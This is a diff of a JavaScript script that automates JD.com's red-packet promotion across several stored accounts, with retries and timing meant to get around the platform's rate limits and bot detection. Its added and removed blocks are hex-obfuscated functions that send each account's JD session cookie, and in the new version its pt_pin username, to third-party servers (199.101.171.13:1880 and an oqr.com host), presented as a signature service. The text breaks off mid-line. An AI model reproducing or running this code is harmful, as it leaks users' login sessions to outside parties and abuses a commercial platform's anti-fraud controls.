@@ -1,12 +1,13 @@
 /*
 锦鲤红包互助
 入口：[京东App领券频道]
-仅内部互助，注意写死LOG怕的请不要用！
+仅内部互助，Log会定时更新！
 
 ============Sami===============
 1、由于签名限制,每次互助都要获取签名,如果担心风险,请禁用该脚本。
 2、新版本的锦鲤红包增加了同账号助力限制,超过2次后就会报火爆，脚本增加了次数检测限制。
 3、为了防止系统火爆,只助力第1账号。
+4、由于每次助力都要获取新的签名，建议大家每天执行4,5次 时间平均间隔好
 */
 
 const $ = new Env("Sami锦鲤红包互助")
@@ -16,7 +17,7 @@ let cookiesArr = [], cookie = '';
 let shareCodes = [];
 !(async () => {
     requireConfig()
-    for (let i = 0; i < 1; i++) {
+    for (let i = 0; i < 4; i++) {
         $.data1 =''
         cookie = cookiesArr[i]
         
@@ -26,10 +27,10 @@ let shareCodes = [];
         let data = await requestApi('h5launch', helpNo(i));
         if (data?.data?.result?.status == 1){
            console.log(`账号【${$.index}】火爆1`)
-           continue;
-           //break;
+           //continue;
+           break;
         }
-        console.log(`\n账号【${$.index}】${$.UserName} 只助力第一个账号`);
+        console.log(`\n账号【${$.index}】${$.UserName} 只助力第1账号`);
         data = await requestApi('h5activityIndex', "body=%7B%22isjdapp%22%3A1%7D");
          if (data?.data?.code == 20002) {
              console.log(`账号${$.index},已达拆红包数量限制`)
@@ -40,8 +41,9 @@ let shareCodes = [];
              shareCodes.push(data.data.result.redpacketInfo.id);
          }
     }
-    //console.log(cookiesArr)
+    await OpenRedEnvelopes($.index);
     await help();
+    await OpenRedEnvelopes($.index);
     await $.wait(5000);
 })()  .catch((e) => {
     $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
@@ -59,27 +61,36 @@ async function help(){
         $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
         $.index = i + 1;
         $.nickName = '';
+        $.UserName1 =encodeURIComponent($.UserName)
         if (i>=0){
-            let data11 = await getBodySign('jinli_h5assist',shareCodes[0],i)
-            //console.log(data11)
+            //console.log($.UserName1)
+            let data11 = await getBodySign(shareCodes[0],i,$.UserName1)
+            if(data11 === undefined){
+                data11 = await getBodySign(shareCodes[0],i,$.UserName1)
+                
+            }
             if (data11.code === 100){
+                //console.log('11')
                 let result = await requestApi('jinli_h5assist', data11.data)
+                //console.log(result)
                 if(result.code === 0 && result.rtn_code === 0){
                    if(result.data.result.status === 0){
                         console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n您已助力成功!\n`);
-                        await setHelpStatus('Setjinli_h5assist');
+                        await setHelpStatus($.UserName1);
                         await $.wait(5000);
                    }else if(result.data.result.status === 4){
                         console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n账号火爆了!\n`);
                         await $.wait(2000);
                    }else if(result.data.result.status === 1){
                         console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n不能重复为好友助力哦!\n`);
-                        await setHelpStatus('Setjinli_h5assist');
+                        await setHelpStatus($.UserName1);
                         await $.wait(2000);
                    }else if(result.data.result.status === 8){
                         console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n抱歉，你不能为自己助力哦!\n`);
                         await $.wait(2000);
                    }
+                }else if(result.code === 0 && result.rtn_code === 403){
+                    console.log(`账号【${$.index}】 助力: 同时段助力太频繁，建议3小时后再执行!\n`);
                 }else if(result.code === 3){
                     console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n账号助力太快,被系统检测到了,只能等下次再执行了!\n`);
                     await $.wait(5000);
@@ -88,24 +99,24 @@ async function help(){
                 //{"code":0,"data":{"biz_code":0,"code":0,"result":{"assistReward":{"beginTime":1646184567315,"discount":"0.03","endTime":1646323199315,"hbId":"33146518371","type":10},"followCode":0,"status":0,"statusDesc":"您已助力成功"},"success":true},"rtn_code":0}
                 await $.wait(5000);
             }else if(data11.code === 102){
-                console.log(`签名网络错误,请稍后重试！`)
+                console.log(`今日签名数据已经用完！`)
                 await $.wait(2000);
             }else if(data11.code === 101){
                 console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n已经助力过,跳过本次助力!\n`);
                 await $.wait(1000);
-            }else if(data11.code === 104){
-                console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n用户信息错误!\n`);
-                await $.wait(1000);
             }else{
                 console.log(`参数错误！`)
+                console.log(data11)
                 await $.wait(1000);
             }
+            
+            
         }
     } 
     } catch (e) {
         $.logErr('Error: ', e, resp)
     } finally {
-        resolve()
+        //resolve()
     }
 }
 
@@ -113,7 +124,6 @@ function requestApi(functionId, body = {}) {
     return new Promise(resolve => {
         $.post({
             url: `https://api.m.jd.com/api?appid=jinlihongbao&functionId=${functionId}&loginType=2&client=jinlihongbao&t=${gettimestamp()}&clientVersion=10.3.4&osVersion=-1`,
-                  //https://api.m.jd.com/api?appid=jinlihongbao&functionId=h5activityIndex&loginType=2&client=jinlihongbao&t=1646029473595&clientVersion=10.3.4&osVersion=-1
             headers: {
                 "Cookie": cookie,
                 "origin": "https://happy.m.jd.com",
@@ -139,6 +149,94 @@ function requestApi(functionId, body = {}) {
     })
 }
 
+async function OpenRedEnvelopes(index){
+    console.log(`\n******开始开红包******\n`);
+    try {
+        cookie = cookiesArr[0]
+        data = await requestApi('h5activityIndex', "body=%7B%22isjdapp%22%3A1%7D");
+        if (data?.data?.code == 20002) {
+             console.log(`账号${index},已达拆红包数量限制`)
+         }else{
+              $.vo2=data.data.result
+            for (let vo of  $.vo2.redpacketConfigFillRewardInfo) {
+                console.log(`账号1,红包金额🧧🧧🧧：`+vo.operationWord)
+                //console.log(vo);
+                if(vo.packetStatus===0){
+                    console.log("  没有可拆的红包！");
+                }else if(vo.packetStatus===1){
+                    //发现可拆红包，开始拆了
+                    console.log("  发现可拆红包");
+                    cookie = cookiesArr[0]
+                    data = await requestApi('h5receiveRedpacketAll', hb());
+                    if(data.code===0){
+                        console.log("  拆到红包金额："+data.data.biz_msg+"-》"+data.data.result.discount);
+                    }else{
+                        console.log("  拆红包失败");
+                    }
+                    await $.wait(5000);
+                }else if(vo.packetStatus===2){
+                    //已经拆过红包了
+                    console.log("  拆到红包金额："+vo.packetAmount);
+                }
+            }
+         }
+    } catch (e) {
+        $.logErr('Error: ', e, resp)
+    } finally {
+        //resolve()
+    }
+}
+
+
+
+
+/*
+function getBodySign(redPacketId,i,UserName){
+     return new Promise(resolve => {
+        $.get({
+            url:`http://199.101.171.13:1880/jinli_h5assist?redPacketId=${redPacketId}&i=${i}`,
+            headers: {
+                "Cookie": cookie,
+                "pt_pin": UserName,
+                "User-Agent": ua
+            },
+        }, (_, resp, data) => {
+            try {
+                data = JSON.parse(data)
+            } catch (e) {
+                $.logErr('Error: ', e, resp)
+            } finally {
+                resolve(data)
+            }
+        })
+    })
+}
+
+function setHelpStatus(UserName){
+     return new Promise(resolve => {
+        $.get({
+            url:`http://199.101.171.13:1880/setjinli_h5assist`,
+            headers: {
+                "pt_pin": UserName,
+                "User-Agent": ua
+            },
+        }, (_, resp, data) => {
+            try {
+                data = JSON.parse(data)
+                
+            } catch (e) {
+                $.logErr('Error: ', e, resp)
+            } finally {
+                resolve(data)
+            }
+        })
+    })
+}
+
+function hb(){
+    return 'body=%7B%22random%22%3A%2256828511%22%2C%22log%22%3A%221647133691611~1QLkKClp2omMDF2UmRnZjAyMQ%3D%3D.R2RQUFdFYVJQV0RmURkLRxZUC1U0Cw0JGEd%2BUktQWmMaVRhHLBMhCzs3EFBSDxZSFxcpMRYuLxc0VyQnCA%3D%3D.52dfd4d7~6%2C1~DBC3A45FC9AD7EDA8EEDDC2EC95388E32CCF6965~1vkdld9~C~ThtBVRAPbRRUAxQMCh4MfRp8fmNyeh5UGkISGRtRDh8MDhoJfhV5c2hyehpRGU0XFBBRABsJfRUMch55fWx3YhVUFEYXGhRUAxQMdx4Mfxp8fmN9Dx5UGkISaBUXTFxYFAxrF10AFQQHGnEIGXV5eQsAGlccQRsZGlYCGwACGX4NFH55d3UCGVgZTBAZFFIBGA8GFHUMGnp8dHwAFEcZQhRtGRtSSlwXDAQcF0pGGggXBwAEAgkMDwYHAAQCBQ0MCgAXGhRHUF0XAhBBQkJEQV9AXhAZFEFVVBsPGlRTQkJEQUxUGh4XRlJeFwNuDB4DDgMcDBUECB4EGgNtGRtfUhAPBRoSVkoXAhAMUlIGUQ9WAQQCBlVVV1oEWwtQBFBTBw4MDwsEDlRWDRsZGlxFFAwSXGldV1xQFBoSQRsPCQQBAQcDBg8MCQQEBxoSX1IXAhBXBVcJUVwFXFNQBlQDUFoNXgJXBQ9SB1oEC1EAAwEDDQlQDFFTD1QFFxUXXkJXFAwSQn9YdVdBAQJJcQ9FSW1WRH95VF8Ge3MXGhReQxsPGnNFRlpVFXpaVUJAQlNCGRl8VlEbFBoSW1hDGggXBwAHDAsHGh4XRVVCFwNuDwEDGgIBAWQZGkBaFAxrF1BlUF1bUwcAGQsXFBBceWUSGRsECxwDFBoSBAkbCxwHFBoSBA8CAQAHFBoSVwpUAVZQBlJRUAlXC1dWDlAAVwoMWgBWBwVTAAwCCwoFUwJTUwBXDRAZFFcSaBUXUV1UFAwSU19TXlRTQkISGRtUUhAPFEMSGRtWURAPFEEDGwsbDBAZFFVWak8XAhAFBBQcF1tRGggXRFdeUVZYBQcDDgQIAAgEGh4XW1wSD2ICFAMEGgJtGRtXVF1SFAwSBA8BDwIMAQICAQwECEwEcVJHc3ZGX31afHt0c1RjbQtfV3JxTXd0BQ8bYAR%2BAm9zUFdsfgdiYlVvU1d3Bnl%2BWHB5bXQNXXteVgxzUHAAeGMJdmpYaUpjZGxofkABcn50XWx6XG9kaHENbmNZZ3NsakV9fFxlXnpkS1t0TEFTeVNeUXtCd3V9dncDcktebHwCBVB7QVllZmJTXX10dQp%2BX2BRdH1WE3R0Y2J3fQ1%2FeUp0WHBJBVJ0e3t4e14ITHVtTwJiZ3tnegh7WXtMb315WW9Xc0UICxgCA1wFXVcBD0hHGQhLRkx3SGJyUWFtUGd6cAdhcn5kbWpydGRicGhBfXF3fHliUlF2fkUFYHBIUm9kQGtlcGd1dntSbWVyXnRhY0NeYHdZXnFmZHRtf0pjfnBXBW9zUFljbnNlY31NYXV9UXtyY1Vwa2Zeb3N1dAFjfmdSC0gAAQhZDgtDFBoSWEpSGggXFEs%3D~1q344el%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D'
+}
+*/
 
 
 function requireConfig() {
@@ -156,15 +254,13 @@ function requireConfig() {
             cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
         }
         console.log(`共${cookiesArr.length}个京东账号\n`)
-        resolve()
+        //resolve()
     })
 }
 function gettimestamp() {
   let time = new Date().getTime();
   return `${time}`;
 }
-
-
 
 
 function random(min, max) {
@@ -189,18 +285,11 @@ function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).index
 
 
 
-
-
-
-
-
-
-
-//getBodySign
-var __encode ='com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdabef=["\x68\x74\x74\x70\x3A\x2F\x2F\x68\x6F\x73\x74\x34\x35\x33\x35\x33\x34\x2E\x75\x73\x2E\x6F\x6F\x71\x72\x2E\x63\x6F\x6D\x2F\x6D\x79\x53\x69\x67\x6E\x2E\x70\x68\x70\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x72\x65\x64\x50\x61\x63\x6B\x65\x74\x49\x64\x3D","\x26\x69\x3D","","\x64\x61\x74\x61\x31","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x81c8x2,_0x81c8x3,_0x81c8x4){return  new Promise((_0x81c8x5)=>{$[__Oxdabef[0x8]]({url:`${__Oxdabef[0x0]}${_0x81c8x2}${__Oxdabef[0x1]}${_0x81c8x3}${__Oxdabef[0x2]}${_0x81c8x4}${__Oxdabef[0x3]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x81c8x6,_0x81c8x7,_0x81c8x8)=>{try{$[__Oxdabef[0x4]]= _0x81c8x8;_0x81c8x8= JSON[__Oxdabef[0x5]](_0x81c8x8)}catch(e){$[__Oxdabef[0x7]](__Oxdabef[0x6],e,_0x81c8x7)}finally{_0x81c8x5(_0x81c8x8)}})})}(function(_0x81c8x9,_0x81c8xa,_0x81c8xb,_0x81c8xc,_0x81c8xd,_0x81c8xe){_0x81c8xe= __Oxdabef[0x9];_0x81c8xc= function(_0x81c8xf){if( typeof alert!== _0x81c8xe){alert(_0x81c8xf)};if( typeof console!== _0x81c8xe){console[__Oxdabef[0xa]](_0x81c8xf)}};_0x81c8xb= function(_0x81c8x10,_0x81c8x9){return _0x81c8x10+ _0x81c8x9};_0x81c8xd= _0x81c8xb(__Oxdabef[0xb],_0x81c8xb(_0x81c8xb(__Oxdabef[0xc],__Oxdabef[0xd]),__Oxdabef[0xe]));try{_0x81c8x9= __encode;if(!( typeof _0x81c8x9!== _0x81c8xe&& _0x81c8x9=== _0x81c8xb(__Oxdabef[0xf],__Oxdabef[0x10]))){_0x81c8xc(_0x81c8xd)}}catch(e){_0x81c8xc(_0x81c8xd)}})({})
-//setHelpStatus
-var __encode ='com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdacb9=["\x68\x74\x74\x70\x3A\x2F\x2F\x68\x6F\x73\x74\x34\x35\x33\x35\x33\x34\x2E\x75\x73\x2E\x6F\x6F\x71\x72\x2E\x63\x6F\x6D\x2F\x6D\x79\x53\x69\x67\x6E\x2E\x70\x68\x70\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","","\x64\x61\x74\x61\x31","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function setHelpStatus(_0xd9d1x2){return  new Promise((_0xd9d1x3)=>{$[__Oxdacb9[0x6]]({url:`${__Oxdacb9[0x0]}${_0xd9d1x2}${__Oxdacb9[0x1]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0xd9d1x4,_0xd9d1x5,_0xd9d1x6)=>{try{$[__Oxdacb9[0x2]]= _0xd9d1x6;_0xd9d1x6= JSON[__Oxdacb9[0x3]](_0xd9d1x6)}catch(e){$[__Oxdacb9[0x5]](__Oxdacb9[0x4],e,_0xd9d1x5)}finally{_0xd9d1x3(_0xd9d1x6)}})})}(function(_0xd9d1x7,_0xd9d1x8,_0xd9d1x9,_0xd9d1xa,_0xd9d1xb,_0xd9d1xc){_0xd9d1xc= __Oxdacb9[0x7];_0xd9d1xa= function(_0xd9d1xd){if( typeof alert!== _0xd9d1xc){alert(_0xd9d1xd)};if( typeof console!== _0xd9d1xc){console[__Oxdacb9[0x8]](_0xd9d1xd)}};_0xd9d1x9= function(_0xd9d1xe,_0xd9d1x7){return _0xd9d1xe+ _0xd9d1x7};_0xd9d1xb= _0xd9d1x9(__Oxdacb9[0x9],_0xd9d1x9(_0xd9d1x9(__Oxdacb9[0xa],__Oxdacb9[0xb]),__Oxdacb9[0xc]));try{_0xd9d1x7= __encode;if(!( typeof _0xd9d1x7!== _0xd9d1xc&& _0xd9d1x7=== _0xd9d1x9(__Oxdacb9[0xd],__Oxdacb9[0xe]))){_0xd9d1xa(_0xd9d1xb)}}catch(e){_0xd9d1xa(_0xd9d1xb)}})({})
 var _0x1ca1=['body=%7B%22followShop%22%3A0%2C%22random%22%3A%2266335111%22%2C%22log%22%3A%221645956626363~11HuwulR4YlMDFOam95UzAyMQ%3D%3D.f1xbTGp7XFlIZXdbWQdmKxJZLwcpBDYJLX9GWVVkYlsRSy1%2FFAoRHCNHLQBjGlg8NAAFJF82CyUlOwkkMA%3D%3D.669322a5~7%2C1~0EB515350D83EE07863282B18DCFD0C3DB27B941~1a5fm4i~C~SRJFXREOam0eGkdbXhQJbxJXBR4EBB52cB4HcmgfVR1EEBQRUQQbBQMcdnIfBXZlH1MeRBMcEVAAHQQPH3BxGgRzfh9FH0YRbx8QVUJfEgkFHRJBSxEPEQcFAAUKBQUEAgQEAQQCCQIBFh0SRV1XFwkUR0BER0RVR1UQHxBFVVASCRZXVkZMR0FGVxEYEkNUXRAJaQceBQAGHAoYAAAeCR8AbhoRXloRCgIeEVFAEAgSBgNXUAlSAFpQBVACUAJWAFMLBVALUAoKB1UAC1FVUQoaHxddRhEOElpgW11dVxEeEEQTCgICBQULDQUDAQAAAgMfEllZEQgRUAFRCFRWBFVRVwhRBlZVC1IAUQMKUAFRAgFRBQQHAAwBVQZbVQxRAxEYElVAURAJEFZafV0cckoEZQJhdWB%2BfQZ8bFt8ZENFER4RXEQSCxJyREFcVxhwWl5GRkBVQRwTe11RHRAeEl9RRRYLEgMOBAwBBBEYEkBTQRAJaQQBBBwFAQdpHRJAVxEPaBRaZFhcXlYDAx4BEB4SWH9gFh0SAwsdAxEaEQUAHQMdABEeEQMEBwgCARYdElALUgxXUwNQUVYAUQFWUQtUAlICCVEGUgEBWwYABAULBFUHU1ULUQcRHhBRE20fFlhfUxoJF1VQVVJWVURHEB8QUlgQChNFERgTU1saCRdEBR0GHgcSHxBQVGxEEAoTAAEWHRJQXBEPEURSWlRcXQ4EBQEABwMBABIfFlxaEAJoBB8GHwRtHxJRXlxVEQgQAQcEBg0EBgQJBQACA00FckIHZGZLRlJHc311dnVmaXJLamd0S3hyCQ0dVHt8dmAASkVTAWpwV19UCmpyQnFwRABjdHEHAHd3Zlt9Sn9AcFgERlNgYnphckcEf0t1anNgXXl1ZmIIeEkMXmFFVEJWYHtkd0hqAH1aXGJ6cUVaYUhidnxKCmx7ZHFHdHBXA3J7Ald4VGNBfGBXRH1icUF%2BZ2cAf0pXcnFjVEVwd3Zrflp8A3hwRnp7QnpPekx6ZmBmfV9WcHN0cHd6AnF3bQB9AVAHekQLDhoIBQULUQNUUUxFHABOTUpzTmZ6aWRkBmlRdXVhe3ViZ2B6SmZndnIAZmhwYVFzZVpwcmEHYnZ3W3VhWmd%2Fd2F2cnBXe210XWluZgZEcXZiBmJwRGdgeFppZHFwAGV%2BYUZgYVhhZXdyand0Y2J6cEdgYXRMa2N3fgZydnNcCU4CUUsDRANKEB4SXENUFgsSEEU%3D~0u0lnvh%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D'];var _0x5b4a=function(_0x1ca154,_0x5b4a2c){_0x1ca154=_0x1ca154-0x0;var _0x552086=_0x1ca1[_0x1ca154];return _0x552086;};function helpNo(_0x10f4c4){if(_0x10f4c4<=0xa){return'body=%7B%22followShop%22%3A0%2C%22random%22%3A%2212018911%22%2C%22log%22%3A%221646029475192~1KnwC8o7cYwMDFMaUpnZTAyMQ%3D%3D.fV9%2BUVV%2BUH5RUn9YfxkkAgwIChU7KBpQG31FfEtSYFg0VRt9FyYUA38ZDh0wAVoeUy4UIDwANQ9eBwwkMg%3D%3D.eceb569b~7%2C1~F159CAFDD5FDBF4F4AA17F3B7BB57EDFA69BA249~1i5wyag~C~SBNFXRAKaBRWBh4FYR9%2BdxoAZ2YfUB9EER0TVAQdBmceegUcAGYDHlcdRxMfE1cGHgRjHHgCHwdnZB9RHUcWbxoTR19eEwlrEVUEHQBmHw51HAZpZR9VHkITHxNXBh4CZR0Jdx4GA2EeUR9EEx8WVgccAWcfCXQcBQBlHEccVRRvHBFXQ10WCAcdEUJAEwkSAgcFBgICCgIEBwMCBAYCAAYTHxNEVFcSCRNFREZER1BHVhEcE0RRUxQLEVdVRUdER0RQEh4SQ1JcEglrBR8CCgIdCh0CAR8BHwRsHBBaWRQIAR8SUkAWCBQFB1RSVQMBBVUBVVcBBVdUU1ZRCFVSUA4AAVUBVwAAVxMdElxAEQwQWWNYXl1REBoTRxMJAAUEBQEDCQYHBgcLAh8SW1gWCBRXUVcHAwcGAwIHUgUCBQdRVgVVBVEHAlBQBQIHAgdWCgACAlRVBlBXEh8SV0NWEAwTX0JVAkN0SWR8A2YEeG57RlRgcgR5WXcTHxNdRxEKEXBBQF5VE3VdXUNFRVZGHhZ4XVIdEx8SXVBHEggSAgAFCQcFEx8WQVVDEQtoCQICHwIGBW8cEURdEglrE1pkWllfVgAAHQISHxNYf2ESHxQDBR0AHwEWHhQAAx8AHwcSHxMABgUJBwMQHBFWU1UAAAIHAwIFUwQCBQBSVgRVB1QBAFVRBwAAAQJXCgAAA1VVBldUEh4SUhRvHBFZXlIWCBRXVVdVV1VERxMdElNaEQwQRREcE1BdEAwTRAIdAx0EER0TU1RvRRQIEgMCEx8WUFITCRNBUF1UXFwMAQAAAg4LAQISHRFZWBQLaAMfAh8Dbh0TUl5fVBQIEgIGBQUEAA8FBgcHAgFOAlpyRmJ%2BSmNoR319dXVZUwVnalJ3cEt%2BcgwMHmQBAnRQW3FlZFhyRmRndWthWGpzdWJeVGJzX259dWZCdVt2enICYVBgXVx8UVYEaHRhS0N1WXpTeWJxBXpdB1xqY3p9ZElaRWpkelx3SQtTe2VbHXBLX2B8dAIBe1ZCV2B0XGJidAd1flllc3JbWGVxSwtAfnMJXXdjdl56ZFhFelpxWmZwQ1VkckRTf3UJcXRbckF9SUtDYHFhen9lfkF9WwtEelpzZ3p0fh1iRwMHeFpTYXRGdmR2clx%2FcHAIRX10YlVwWnJpYktDVHpzA0hkSVhhYnB0an1ZW3J%2FSGYNHwcCA1QCBQEGT0kcAk9PTnBOZ118ZWtyaHpydGN0YEZpcHRbdWdjRwZha15damF2QXJyVQJpYklAaWJycnx3cXRicQdzZWdIYHRhXwdzdFYKdHFHdmZ2clFkdWcKZ3ZyXmZsWlVmZHNhZXRcZnRwV1FRdGNgZ3ZXBWRySkEMTQFJCAJaAEYTHBBdQFEQChESTA%3D%3D~1j6z9l5%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D';}if(_0x10f4c4<=0x14&&_0x10f4c4>0xa){return'body=%7B%22followShop%22%3A0%2C%22random%22%3A%2217826611%22%2C%22log%22%3A%221645956276992~1lg4WcZRHZ4MDFWa0FPZjAyMQ%3D%3D.Z111el9jXXN5XmRYeDEKDiknFx5lPTMgGGdHd2NRelo%2FfRhnFSQnKTtGAzZWAlkSAjUdJXEAPj0kFT8RKA%3D%3D.9078e19b~7%2C1~0034B33DDBD019F5BFCCCCA53AB289D3E40B05BC~0abzu6z~C~SBJFXxILa2wUEEVfWxEKaRVWAR4HfRV2CB8GZHscUBxFGh4TVQEeB3wbdwwfBmVvH1EfRBMeElUBHA99HXQPHwZrDh5BH0QRZB8SVEJfEAoAHBNLQRMLFAIGBgILAQUCBQEDAAYICAUIExwTT1dVEwwRREZDRkBVRVUbHxJEVVAQChNWV0xGRUVDUhIeFUJQXRIJYgccBAAGHgkdAQEUAx0Eax8SWF0QDgIcEVpAEgkSBgFUVQhTClBSAVUHUwRRAVcLB1AAUAgLB1UCCFRUUAAQHRNYQxIIFVtkW19dXBEcEUQTCAEHBAQBBwcDAQUJCwUeFllbEQMRUgBRCFZVAVRQXQJTAlNQCFQHUAcKUgFaAgNQBQQFAwkAVAxRVwhUBhIeFVREURIJG1ZYfF0ccEkBZANrf2J6eAN%2Falx9YENHERURXkUSCxBxQUBdXRJyXltDRUZSQBgTeV1aHRIfEl9TRhMKEwkEBggEARIeFUFXQRIJYgQDBRwFAwRsHBNKXRMLbRFZYl9dWlYBAxUBEh8SWH1jExwTCQEfBxQfEgMHHAcdAhEVEQEFBwgAAhMcE1oBUAhSVgBWVlcEUQNWWgtWA1ICC1IDUwALUQQEAQAIAlIGV1UJUQwRHBFRE28cE1leWRALE1BVVlRRVEBHEh8bUloRChNHEh0SUlEQCxNBAB4AGQYWHxJQX2xGEQoTAgITHBNaVhMLFEFRXFNdWQ4BBAEBBgUBABAcE11bGghqABoDHAJqHhZRXFxeEQoRAQcGBQgFBwoEBggOBU4DbwUGRXp6fmZ%2FQ311dHdSZQB7ZHVwTn1xDwocUANUBl0BAUliAgsDaAMEcVRLRld6WF0HUV1hG3x6fgN4WnNWfgMFGllZcEtScEABc0tDXHVwUgp6cmJCenFCZlJAWkFjZAdddV9ndXBJXFx6SFRVdUVlcnJGcVh1cHhWemNQXnYDW1R%2FW2VFd2VncXxzfGF5cGNbenJ%2FD3xgWEpjcURfY0pwdnZgR2hxc2h%2Bc0p9YXRqAGVqYHRKf2t6XHNHeHlwCl4GdUEODRxVVA0HAVYBUE5KHABMTk9yT2tae2BuS3V5cmRXf3hEaGd4cWJgd1dCUWZQe1d0cEtxd2ZFZnZYC25ncn59dEVTYXNGYWZ3c3BnZmUGenFUW2Z4RHVhd3NCdHdxQmt0cwllZHVdZXFcdnN7aHJ0cVd8YXhJamt9RUZlc1hDD0kDXlgGSQpcEh8SXEFXEwoTGk8%3D~18l5kyt%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D';}if(_0x10f4c4<=0x1e&&_0x10f4c4>0x14){return _0x5b4a('0x0');}}
 
-
-
+//getBodySign
+var __encode ='',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdb1d0=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x6A\x69\x6E\x6C\x69\x5F\x68\x35\x61\x73\x73\x69\x73\x74\x3F\x72\x65\x64\x50\x61\x63\x6B\x65\x74\x49\x64\x3D","\x26\x69\x3D","","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x60b3x2,_0x60b3x3,_0x60b3x4){return  new Promise((_0x60b3x5)=>{$[__Oxdb1d0[0x6]]({url:`${__Oxdb1d0[0x0]}${_0x60b3x2}${__Oxdb1d0[0x1]}${_0x60b3x3}${__Oxdb1d0[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x60b3x4,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x60b3x6,_0x60b3x7,_0x60b3x8)=>{try{_0x60b3x8= JSON[__Oxdb1d0[0x3]](_0x60b3x8)}catch(e){$[__Oxdb1d0[0x5]](__Oxdb1d0[0x4],e,_0x60b3x7)}finally{_0x60b3x5(_0x60b3x8)}})})}(function(_0x60b3x9,_0x60b3xa,_0x60b3xb,_0x60b3xc,_0x60b3xd,_0x60b3xe){_0x60b3xe= __Oxdb1d0[0x7];_0x60b3xc= function(_0x60b3xf){if( typeof alert!== _0x60b3xe){alert(_0x60b3xf)};if( typeof console!== _0x60b3xe){console[__Oxdb1d0[0x8]](_0x60b3xf)}};_0x60b3xb= function(_0x60b3x10,_0x60b3x9){return _0x60b3x10+ _0x60b3x9};_0x60b3xd= _0x60b3xb(__Oxdb1d0[0x9],_0x60b3xb(_0x60b3xb(__Oxdb1d0[0xa],__Oxdb1d0[0xb]),__Oxdb1d0[0xc]));try{_0x60b3x9= __encode;if(!( typeof _0x60b3x9!== 